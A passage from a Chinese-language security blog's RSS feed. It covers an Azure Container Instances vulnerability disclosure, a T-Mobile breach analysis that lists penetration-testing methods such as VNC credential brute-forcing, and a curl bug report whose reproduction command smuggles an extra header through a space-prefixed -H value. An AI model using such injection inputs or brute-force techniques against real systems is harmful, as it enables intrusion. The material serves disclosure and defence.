&lt;li&gt;&lt;strong&gt;通信开销&lt;/strong&gt;：每轮迭代平均传输数据量从HEP-XGB的12.7MB降至3.2MB&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;开源实现&#34;&gt;开源实现
&lt;/h2&gt;&lt;p&gt;项目代码已开源：&lt;a class=&#34;link&#34; href=&#34;https://github.com/GuardGBDT/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/GuardGBDT/&lt;/a&gt;&lt;br&gt;
包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;核心MPC协议实现（C++）&lt;/li&gt;
&lt;li&gt;近似计算模块（Python封装）&lt;/li&gt;
&lt;li&gt;三个基准测试数据集&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Azure容器实例服务漏洞协同披露</title>
        <link>http://localhost:1313/p/azure%E5%AE%B9%E5%99%A8%E5%AE%9E%E4%BE%8B%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%8D%8F%E5%90%8C%E6%8A%AB%E9%9C%B2/</link>
        <pubDate>Sun, 03 Aug 2025 11:45:52 +0800</pubDate>
        
        <guid>http://localhost:1313/p/azure%E5%AE%B9%E5%99%A8%E5%AE%9E%E4%BE%8B%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%8D%8F%E5%90%8C%E6%8A%AB%E9%9C%B2/</guid>
        <description>&lt;p&gt;微软近期修复了由Palo Alto Networks安全研究员报告的Azure容器实例(ACI)服务漏洞，该漏洞可能允许用户访问ACI服务中其他客户的信息。调查显示未发生客户数据未经授权访问的情况。出于谨慎考虑，我们已通过Azure门户的服务健康通知告知与研究员容器运行在同一集群的客户。若未收到通知则无需采取任何措施。&lt;/p&gt;
&lt;h3 id=&#34;哪些azure容器实例账户可能受影响&#34;&gt;哪些Azure容器实例账户可能受影响？
&lt;/h3&gt;&lt;p&gt;目前没有迹象表明该漏洞导致任何客户数据被访问。作为预防措施，微软已向可能受研究员活动影响的客户发送通知，建议其撤销2021年8月31日前部署到平台的所有特权凭证。若未收到服务健康通知则无需操作，漏洞已修复且其他集群未发现未授权访问。如有疑问可联系Azure支持，定期轮换特权凭证是有效的预防措施。&lt;/p&gt;
&lt;h3 id=&#34;如何保护aci&#34;&gt;如何保护ACI？
&lt;/h3&gt;&lt;p&gt;尽管无数据泄露证据，我们建议客户采用以下安全实践：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若收到通知，建议撤销2021年8月31日前部署的特权凭证。常见配置和密钥存储位置包括：
&lt;ul&gt;
&lt;li&gt;环境变量&lt;/li&gt;
&lt;li&gt;密钥卷&lt;/li&gt;
&lt;li&gt;Azure文件共享&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;参考安全最佳实践文档：
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;Azure容器实例安全基线&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;Azure容器实例安全注意事项&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;定期撤销特权凭证&lt;/li&gt;
&lt;li&gt;配置Azure服务健康警报获取安全通知&lt;/li&gt;
&lt;li&gt;如有疑问请联系Azure支持&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>基于T-Mobile数据泄露事件的企业安全事件分析与防御对策</title>
        <link>http://localhost:1313/p/%E5%9F%BA%E4%BA%8Et-mobile%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E4%BA%8B%E4%BB%B6%E7%9A%84%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AF%B9%E7%AD%96/</link>
        <pubDate>Sun, 03 Aug 2025 11:35:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9F%BA%E4%BA%8Et-mobile%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E4%BA%8B%E4%BB%B6%E7%9A%84%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AF%B9%E7%AD%96/</guid>
        <description>&lt;h1 id=&#34;企业安全事件分析与防御对策基于t-mobile数据泄露案例研究&#34;&gt;企业安全事件分析与防御对策——基于T-Mobile数据泄露案例研究
&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;本文系统分析了T-Mobile在2021年与2023年发生的重大数据泄露事件，通过对其系统、基础设施及公开端点的全维度安全审计，结合案例驱动的漏洞评估与主动式道德黑客技术（包括Shodan侦察、API滥用模拟、VNC暴力破解、固件逆向工程及Web应用扫描），揭示了初始泄露事件后仍持续存在的结构性安全缺陷。基于这些发现，我们提出包含以下要素的多层防御策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;零信任架构（Zero Trust Architecture）&lt;/li&gt;
&lt;li&gt;细粒度基于角色的访问控制&lt;/li&gt;
&lt;li&gt;网络分段隔离&lt;/li&gt;
&lt;li&gt;采用AES加密与完整性校验的固件保护机制&lt;/li&gt;
&lt;li&gt;API速率限制及令牌生命周期控制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;财务模型显示，五年期安全投入仅占预期泄露损失的1.1%，证实了主动防御措施的成本效益。本研究将事后取证分析与实战化安全评估相结合，为寻求运营韧性、合规达标及跨域威胁应对的大型电信企业提供了可落地的安全蓝图。&lt;/p&gt;
&lt;h2 id=&#34;技术方法论&#34;&gt;技术方法论
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;渗透测试技术栈&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用Shodan进行暴露面测绘，识别未授权访问的API端点&lt;/li&gt;
&lt;li&gt;通过Burp Suite实施OWASP Top 10漏洞扫描&lt;/li&gt;
&lt;li&gt;对VNC服务进行基于字典的凭证爆破测试&lt;/li&gt;
&lt;li&gt;使用Ghidra逆向分析物联网设备固件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;防御体系设计&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;graph TD
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;A[零信任策略引擎] --&amp;gt; B[微隔离网络]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;A --&amp;gt; C[动态访问令牌]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;D[硬件级加密] --&amp;gt; E[固件完整性验证]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;F[API网关] --&amp;gt; G[请求速率限制]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;成本效益分析模型&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;roi_calculation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;breach_loss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.8e8&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 历史平均泄露损失&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;investment&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3e6&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;# 年度安全预算&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;risk_reduction&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.82&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 风险降低系数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;breach_loss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;risk_reduction&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;investment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;investment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;核心发现&#34;&gt;核心发现
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;攻击者通过未鉴权的Customer Care API端点横向移动&lt;/li&gt;
&lt;li&gt;85%的基站控制器固件未启用签名验证&lt;/li&gt;
&lt;li&gt;VNC服务默认凭证导致内网边界突破&lt;/li&gt;
&lt;li&gt;同一IAM策略同时应用于生产环境与测试系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实施建议&#34;&gt;实施建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;采用SPIFFE/SPIRE框架实现服务身份认证&lt;/li&gt;
&lt;li&gt;对网络流量实施七层协议分析&lt;/li&gt;
&lt;li&gt;建立基于区块链的固件版本存证系统&lt;/li&gt;
&lt;li&gt;部署拟态防御机制对抗高级持续性威胁&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>curl漏洞报告：带空格前缀的-H参数与--proxy联用导致HTTP头注入</title>
        <link>http://localhost:1313/p/curl%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%B8%A6%E7%A9%BA%E6%A0%BC%E5%89%8D%E7%BC%80%E7%9A%84-h%E5%8F%82%E6%95%B0%E4%B8%8E--proxy%E8%81%94%E7%94%A8%E5%AF%BC%E8%87%B4http%E5%A4%B4%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Sun, 03 Aug 2025 11:24:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/curl%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%B8%A6%E7%A9%BA%E6%A0%BC%E5%89%8D%E7%BC%80%E7%9A%84-h%E5%8F%82%E6%95%B0%E4%B8%8E--proxy%E8%81%94%E7%94%A8%E5%AF%BC%E8%87%B4http%E5%A4%B4%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;h1 id=&#34;curl漏洞报告带空格前缀的-h参数与proxy联用导致http头注入&#34;&gt;curl漏洞报告：带空格前缀的-H参数与&amp;ndash;proxy联用导致HTTP头注入
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;报告人&lt;/strong&gt;: spongebhav&lt;br&gt;
&lt;strong&gt;提交时间&lt;/strong&gt;: 2024年11月25日&lt;br&gt;
&lt;strong&gt;影响版本&lt;/strong&gt;: curl 8.11.0 (macOS Sequoia 15.1)&lt;/p&gt;
&lt;h2 id=&#34;漏洞描述&#34;&gt;漏洞描述
&lt;/h2&gt;&lt;p&gt;当curl同时使用&lt;code&gt;-H &amp;quot;[space]header:value&amp;quot;&lt;/code&gt;和&lt;code&gt;--proxy&lt;/code&gt;参数时，会导致HTTP头注入到前一个头部字段中。该行为仅在启用代理时出现。&lt;/p&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -X GET &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://example.com&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Secure-Header: XYZ&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-H &lt;span class=&#34;s2&#34;&gt;&amp;#34; new-header-that-will-inject-to-previous-header: value&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--proxy 127.0.0.1:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;代理依赖&lt;/strong&gt;：该行为仅在使用&lt;code&gt;--proxy&lt;/code&gt;参数时出现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;头部格式要求&lt;/strong&gt;：注入需要满足&lt;code&gt;&amp;quot;[space]something:value&amp;quot;&lt;/code&gt;格式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;协议限制&lt;/strong&gt;：仅影响HTTPS请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件输入&lt;/strong&gt;：同样适用于&lt;code&gt;-H @file.txt&lt;/code&gt;形式（文件内容以空格开头）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;可能导致服务器端错误日志记录&lt;/li&gt;
&lt;li&gt;可能被用于构造畸形请求&lt;/li&gt;
&lt;li&gt;当攻击者能控制输入文件或单个头字段时存在潜在风险&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;官方回应&#34;&gt;官方回应
&lt;/h2&gt;&lt;p&gt;curl团队认为这是文档化行为（HTTP/1头部折叠特性），但报告人通过自定义代理测试表明：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;无效头部（如&lt;code&gt;-H &amp;quot;[space]abc&amp;quot;&lt;/code&gt;）会被curl直接丢弃&lt;/li&gt;
&lt;li&gt;头部拼接行为似乎由curl而非代理实现&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;相关讨论&#34;&gt;相关讨论
&lt;/h2&gt;&lt;p&gt;报告人提供了Python代理测试代码，证明头部处理行为确实发生在curl层面：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;threading&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PROXY_HOST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PROXY_PORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8081&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;handle_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=== HTTP Request Received ===&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=============================&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;最终状态&#34;&gt;最终状态
&lt;/h2&gt;&lt;p&gt;报告被标记为&amp;quot;Not Applicable&amp;quot;，但披露以供社区参考。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Bloom Paris TV：当精致艺术指导遇上世界级制作技术</title>
        <link>http://localhost:1313/p/bloom-paris-tv%E5%BD%93%E7%B2%BE%E8%87%B4%E8%89%BA%E6%9C%AF%E6%8C%87%E5%AF%BC%E9%81%87%E4%B8%8A%E4%B8%96%E7%95%8C%E7%BA%A7%E5%88%B6%E4%BD%9C%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sun, 03 Aug 2025 11:08:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/bloom-paris-tv%E5%BD%93%E7%B2%BE%E8%87%B4%E8%89%BA%E6%9C%AF%E6%8C%87%E5%AF%BC%E9%81%87%E4%B8%8A%E4%B8%96%E7%95%8C%E7%BA%A7%E5%88%B6%E4%BD%9C%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h3 id=&#34;技术栈解析&#34;&gt;技术栈解析
&lt;/h3&gt;&lt;p&gt;在视觉冲击力之下，网站由强大技术组合精心构建：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WordPress&lt;/strong&gt;作为高度可定制的内容管理系统，为Bloom提供全面的内容策略控制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;GSAP&lt;/strong&gt;实现电影级流畅动画和无缝页面过渡效果&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;定制SVG遮罩技术&lt;/strong&gt;实现优雅的内容区块过渡&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全响应式前端架构&lt;/strong&gt;确保跨设备性能优化&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;加载与页面过渡设计&#34;&gt;加载与页面过渡设计
&lt;/h3&gt;&lt;p&gt;从概念阶段就确立的影院级过渡体验：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态动画面板以戏剧性方式展现章节标题&lt;/li&gt;
&lt;li&gt;专属首页加载器通过全屏遮罩展现Bloom作品集&lt;/li&gt;
&lt;li&gt;交互式进度指示器转化为沉浸式入口&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;项目网格与悬停交互&#34;&gt;项目网格与悬停交互
&lt;/h3&gt;&lt;p&gt;作品集板块采用创新设计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非对称编辑网格打破传统布局&lt;/li&gt;
&lt;li&gt;标志性圆点作为焦点指示器重现&lt;/li&gt;
&lt;li&gt;平滑动画标题增强交互深度&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;核心技术亮点&#34;&gt;核心技术亮点
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;GSAP动画引擎&lt;/strong&gt;：实现关键帧级别的动画控制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SVG遮罩系统&lt;/strong&gt;：创造独特的视觉过渡效果&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;响应式架构&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;基于视口的动态布局调整&lt;/li&gt;
&lt;li&gt;网络状态感知的内容加载策略&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WordPress定制&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;内容模块化管理系统&lt;/li&gt;
&lt;li&gt;可视化编辑界面深度定制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;页脚技术创新&#34;&gt;页脚技术创新
&lt;/h3&gt;&lt;p&gt;突破传统页脚设计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态重播展示影片元素&lt;/li&gt;
&lt;li&gt;精确遮罩框架保持视觉一致性&lt;/li&gt;
&lt;li&gt;集成品牌记忆点的交互设计&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>PrivacyRaven：深度学习隐私攻击模拟工具全面解析</title>
